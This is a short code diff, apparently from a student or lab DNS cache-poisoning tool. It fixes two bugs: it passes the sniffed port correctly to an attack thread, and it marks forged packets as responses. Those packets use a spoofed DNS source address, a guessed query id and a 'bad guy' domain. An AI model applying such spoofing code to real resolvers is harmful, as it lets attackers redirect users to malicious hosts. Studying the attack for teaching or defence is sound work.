@@ -64,7 +64,7 @@ def dns_server_routine():
                   str(sniffed_ip.dport) + "\nTarget port response (source port) is " +
                   str(target_port) + "\n")
 
-            bite_rat_thread = threading.Thread(name="bite_rat_thread", target=bite_the_rat, args=target_port)
+            bite_rat_thread = threading.Thread(name="bite_rat_thread", target=bite_the_rat, args=[target_port])
             print(DNS_ROUTINE_HEADER + "Bite the rat!")
             bite_rat_thread.start()
             bite_rat_thread.join()
@@ -85,6 +85,7 @@ def bite_the_rat(target_port_sniffed):
         # since we've to guess the query id we define a time-based pseudo random generator
         query_id = current_milli_time() % 65536  # 16 bit maximum delimiter of query_id's DNS field
         packet = IP(src=SPOOFED_DNS, dst=TARGET_IP) / UDP(dport=target_port_sniffed) / DNS(id=query_id,
+                                                                                           qr=1,
                                                                                            an=None,
                                                                                            qd=DNSQR(
                                                                                                qname=DNS_URL_BADGUY,
